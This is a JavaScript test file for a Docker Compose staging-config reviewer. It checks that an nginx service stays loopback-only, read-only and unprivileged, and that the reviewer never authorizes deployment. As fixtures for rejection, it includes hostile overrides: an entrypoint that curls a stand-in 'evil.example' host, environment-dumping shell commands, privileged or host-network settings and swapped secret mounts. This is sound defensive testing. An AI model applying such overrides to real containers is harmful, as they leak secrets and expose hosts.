import test from 'node:test';
import assert from 'node:assert/strict';
import {spawnSync} from 'node:child_process';
import {fileURLToPath} from 'node:url';
import {resolve} from 'node:path';
import {reviewEffectivePrivateStagingCompose as review}
  from '../src/lib/effective-staging-compose-review.mjs';

const projectRoot=resolve('/tmp/imagine-f254-reviewed-project');
const expectedAuthPath=resolve('/tmp/imagine-f254-private-htpasswd');
const expectedImage='nginxinc/nginx-unprivileged@sha256:'+('ab'.repeat(32));
const opts=()=>({projectRoot,expectedAuthPath,expectedImage});
const fake=()=>({
  name:'imagine-comercial-staging',
  services:{
    'static-review':{
      image:expectedImage,restart:'no',user:'101:101',
      read_only:true,cap_drop:['ALL'],security_opt:['no-new-privileges:true'],
      pids_limit:64,mem_limit:'256m',cpus:0.5,
      environment:{TZ:'UTC'},networks:{default:null},
      ports:[{mode:'ingress',target:8080,published:'4321',
        protocol:'tcp',host_ip:'127.0.0.1'}],
      volumes:[
        {type:'bind',source:resolve(projectRoot,'dist'),
          target:'/usr/share/nginx/html',read_only:true,bind:{create_host_path:true}},
        {type:'bind',source:resolve(projectRoot,'ops/staging/nginx.conf'),
          target:'/etc/nginx/conf.d/default.conf',read_only:true},
        {type:'bind',source:expectedAuthPath,
          target:'/etc/nginx/auth/.htpasswd',read_only:true}
      ],
      tmpfs:['/tmp:rw,noexec,nosuid,size=32m',
        '/var/run:rw,noexec,nosuid,size=4m']
    }
  },
  networks:{default:{name:'review_default'}}
});
const mutate=(fn)=>{
  const value=structuredClone(fake());
  fn(value,value.services['static-review']);
  return value;
};
test('F254 checks canonical resolved Compose model but NEVER authorizes runtime',()=>{
  const r=review(fake(),opts());
  assert.equal(r.status,'RESOLVED_CONFIG_MODEL_REVIEW_ONLY');
  assert.equal(r.localLoopbackPort,true);
  assert.equal(r.singleUnprivilegedService,true);
  assert.equal(r.allThreeMountsReadOnly,true);
  for(const key of ['actualDockerContainerInspected','actualNetworkExposureVerified',
    'imageProvenanceIndependentlyVerified','tlsAndSshVerified',
    'canDeploy','deploymentAuthorized','deploymentPerformed'])
    assert.equal(r[key],false,key);
  assert.ok(Object.isFrozen(r));
  for(const secret of [expectedImage,expectedAuthPath,projectRoot])
    assert.equal(JSON.stringify(r).includes(secret),false);
  const bytes=mutate((_d,s)=>{s.mem_limit=268435456;s.cpus='0.5';});
  assert.equal(review(bytes,opts()).deploymentAuthorized,false);
  const normalized=mutate((document,service)=>{
    service.command=null;
    service.entrypoint=null;
    document.networks.default.ipam={driver:'default',config:[]};
  });
  assert.equal(review(normalized,opts()).deploymentAuthorized,false,
    'F255 actual Docker Compose normalizes omitted commands to null');
  for(const change of [
    service=>{service.command=['sh','-c','env'];},
    service=>{service.entrypoint=['/bin/bash'];},
    service=>{service.command='nginx -g daemon off;';},
    service=>{service.entrypoint='curl https://evil.example';}
  ]){
    const malicious=mutate((_d,service)=>{
      service.command=null;
      service.entrypoint=null;
      change(service);
    });
    assert.throws(()=>review(malicious,opts()),/F254/,
      'F255 forbids real command/entrypoint overrides');
  }
});
test('F254 rejects public ports, extra services, host network and elevated container privileges',()=>{
  const attacks=[
    (_d,s)=>{s.ports[0].host_ip='0.0.0.0';},
    (_d,s)=>{s.ports[0].host_ip='';},
    (_d,s)=>{s.ports[0].published='443';},
    (_d,s)=>{s.ports.push({...s.ports[0],published:'8081'});},
    (d)=>{d.services.other={image:'nginx:latest',ports:[{target:80,published:'80'}]};},
    (_d,s)=>{s.network_mode='host';},
    (_d,s)=>{s.privileged=true;},
    (_d,s)=>{s.user='0:0';},
    (_d,s)=>{s.cap_add=['NET_ADMIN'];},
    (_d,s)=>{s.cap_drop=[];},
    (_d,s)=>{s.security_opt=['no-new-privileges:false'];},
    (_d,s)=>{s.read_only=false;},
    (_d,s)=>{s.restart='always';},
    (_d,s)=>{s.pids_limit=1024;},
    (_d,s)=>{s.mem_limit='2048m';},
    (_d,s)=>{s.cpus=4;},
    (_d,s)=>{s.environment.AWS_ACCESS_KEY_ID='SECRET';},
    (_d,s)=>{s.entrypoint=['/bin/sh','-c','printenv'];},
    (d)=>{d.networks.default.external=true;},
    (d)=>{d.networks.default.ipam={driver:'bridge',config:[]};},
    (d)=>{d.networks.default.ipam={driver:'default',
      config:[{subnet:'0.0.0.0/0'}]};},
    (d)=>{d.networks.default.ipam={driver:'default',options:{proxy:'unsafe'}};},
    (d)=>{d.secrets={secret:'value'};}
  ];
  for(const attack of attacks){
    assert.throws(()=>review(mutate(attack),opts()),/F254|F164/);
  }
});
test('F254 forbids mounting extra paths, writable auth, untrusted image or swapped source',()=>{
  const attacks=[
    (_d,s)=>{s.volumes[0].read_only=false;},
    (_d,s)=>{s.volumes[2].read_only=false;},
    (_d,s)=>{s.volumes[1].source='/tmp/unreviewed/nginx.conf';},
    (_d,s)=>{s.volumes[2].source='/tmp/other-secret';},
    (_d,s)=>{s.volumes.push({...s.volumes[0],target:'/var/log/nginx'});},
    (_d,s)=>{s.volumes[0].type='volume';},
    (_d,s)=>{s.volumes[0].bind.propagation='rshared';},
    (_d,s)=>{s.volumes[0].target='/etc/nginx/conf.d/default.conf';},
    (_d,s)=>{s.image='nginx:latest';},
    (_d,s)=>{s.tmpfs=['/tmp:rw'];},
    (_d,s)=>{s.tmpfs[0]='/tmp:exec';}
  ];
  for(const attack of attacks)
    assert.throws(()=>review(mutate(attack),opts()),/F254|F164/);
});
test('F254 malformed or incomplete JSON model fails closed, not a release signal',()=>{
  for(const payload of [null,[],{},'bad',{services:{}},
    {services:{'static-review':null}},
    {services:{'static-review':{}}}]){
    assert.throws(()=>review(payload,opts()),/F254|F164/);
  }
  assert.throws(()=>review(fake(),{...opts(),expectedImage:'nginx:latest'}),/F254|F164/);
  assert.throws(()=>review(fake(),{...opts(),expectedAuthPath:projectRoot+'/secret'}),/F254/);
  assert.throws(()=>review(fake(),{...opts(),projectRoot:'relative'}),/F254/);
});
test('F254 private stdin CLI accepts only explicit operator and never logs resolved private paths',()=>{
  const script=fileURLToPath(new URL('../scripts/check-effective-staging-compose.mjs',import.meta.url));
  const cwd=fileURLToPath(new URL('..',import.meta.url));
  // The CLI expects mounts from cwd; fixture is constructed from the same root.
  const originalRoot=resolve(cwd);
  const fixture=fake();
  fixture.services['static-review'].volumes[0].source=resolve(originalRoot,'dist');
  fixture.services['static-review'].volumes[1].source=resolve(originalRoot,'ops/staging/nginx.conf');
  const input=JSON.stringify(fixture);
  const env={...process.env,IMAGINE_PRIVATE_STAGING_REVIEW:'1',
    GITHUB_ACTIONS:'',IMAGINE_STAGING_NGINX_IMAGE:expectedImage,
    IMAGINE_STAGING_HTPASSWD_PATH:expectedAuthPath};
  const run=(inputText,extra={})=>spawnSync(process.execPath,[script],{
    cwd,encoding:'utf8',timeout:15000,input:inputText,env:{...env,...extra}
  });
  const ok=run(input);
  assert.equal(ok.status,0,ok.stderr);
  assert.equal(JSON.parse(ok.stdout).deploymentAuthorized,false);
  const ci=run(input,{GITHUB_ACTIONS:'true'});
  assert.equal(ci.status,2);
  assert.equal(ci.stdout,'');
  assert.match(ci.stderr,/not verified \(HOLD\)/);
  const malformed=run('{NOT_JSON '+expectedAuthPath);
  assert.equal(malformed.status,2);
  assert.equal(malformed.stdout,'');
  const oversized=run('X'.repeat(65537));
  assert.equal(oversized.status,2);
  for(const v of [ok.stdout,ok.stderr,ci.stdout,ci.stderr,
    malformed.stdout,malformed.stderr,oversized.stdout,oversized.stderr])
    for(const secret of [expectedImage,expectedAuthPath,projectRoot])
      assert.equal(v.includes(secret),false);
});
